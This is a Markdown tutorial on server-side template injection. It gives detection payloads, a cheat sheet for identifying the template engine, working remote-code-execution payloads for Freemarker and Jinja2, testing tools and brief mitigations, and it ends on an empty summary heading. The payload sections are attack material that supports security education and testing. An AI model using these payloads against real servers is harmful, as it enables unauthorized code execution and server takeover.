# 🔥 Server-Side Template Injection (SSTI) – Full Guide

## 📌 What is SSTI?

**Server-Side Template Injection (SSTI)** is a vulnerability that occurs when user-supplied input is unsafely embedded into server-side templates. If an application uses a template engine and renders user input without proper sanitization, an attacker can inject expressions into the template and execute arbitrary code on the server.

---

## 🚨 Why is SSTI Dangerous?

* Remote Code Execution (RCE)
* Access to sensitive objects or files
* Server takeover or lateral movement
* Leaking server internals (file path, memory references, etc.)

---

## 🧠 Common Template Engines Vulnerable to SSTI

| Template Engine | Language | Syntax Examples                                                  |
| --------------- | -------- | ---------------------------------------------------------------- |
| **Jinja2**      | Python   | `{{7*7}}`, `{{config}}`                                          |
| **Twig**        | PHP      | `{{7*7}}`, `{{dump()}}`                                          |
| **Smarty**      | PHP      | `{$var}`, `{php}...{/php}`                                       |
| **Freemarker**  | Java     | `${7*7}`, `${"freemarker.template.utility.Execute"?new()("id")}` |
| **Velocity**    | Java     | `#set($x = 7*7)`                                                 |
| **ERB**         | Ruby     | `<%= 7*7 %>`                                                     |
| **Nunjucks**    | JS       | `{{7*7}}`, `{{global.process}}`                                  |

---

## 🔍 How to Detect SSTI?

To detect SSTI in user-controllable input, follow these steps:

### Step 1: Inject a Simple Payload

Start with a basic arithmetic expression like:

```http
Input: {{7*7}}
```

If the response shows:

```html
Output: 49
```

Then it’s very likely SSTI is present.

### Step 2: Try Other Payloads

Different template engines respond to different syntaxes. Try the following:

```txt
{{7*7}}                       → Jinja2 / Twig / Nunjucks
${7*7}                        → Freemarker / Velocity
<%= 7*7 %>                    → ERB (Ruby)
{$smarty.now}                → Smarty (PHP)
{{config.items()}}           → Jinja2
{{''.__class__.__mro__[1].__subclasses__()}} → Jinja2 (deep test)
{{ dump() }}                 → Twig
```

---

## 🕵️‍♂️ How to Identify the Template Engine?

Use syntax differences and output responses to guess the engine. Here’s a cheat sheet:

| Test Payload    | If Output Shows... | Likely Engine            |
| --------------- | ------------------ | ------------------------ |
| `{{7*7}}`       | 49                 | Jinja2 / Twig / Nunjucks |
| `${7*7}`        | 49                 | Freemarker / Velocity    |
| `<%= 7*7 %>`    | 49                 | ERB (Ruby)               |
| `{$smarty.now}` | Current Date/Time  | Smarty                   |
| `{{ dump() }}`  | Object Dump        | Twig                     |

You can also use **error messages** to help identify the engine:

* `TemplateSyntaxError` → Jinja2
* `Unknown tag` → Twig
* `Expected expression` → Smarty
* `freemarker.core` → Freemarker

---

## ⚔️ Exploiting SSTI

If the SSTI is confirmed, the next step is to try code execution or object access.

### 🧬 Freemarker RCE Payloads

```freemarker
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.Runtime").getRuntime().exec("id")}
```

### 🧬 Jinja2 RCE Payloads

```jinja
{{''.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__['os'].popen('id').read()}}
```

*(Note: Index \[138] may vary)*

---

## 🧰 Tools for SSTI Testing

* [**tplmap**](https://github.com/epinna/tplmap): Tool for automatic SSTI detection and exploitation.
* **Burp Suite Repeater / Intruder**: For manual testing and automation.
* Custom Python/PHP scripts for fuzzing inputs.

---

## 🛡️ Prevention and Mitigation

* Never render user input directly in templates
* Use strict template sandboxing
* Encode or sanitize user input before rendering
* Use static templates for rendering whenever possible
* Apply Content Security Policies (CSP)

---

## 📎 References

* 🔗 [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
* 🔗 [OWASP SSTI Guide](https://owasp.org/www-community/attacks/Template_Injection)
* 🔗 [tplmap – Epinna](https://github.com/epinna/tplmap)
* 🔗 (https://swisskyrepo.github.io/PayloadsAllTheThings)
---

## ✅ Summary
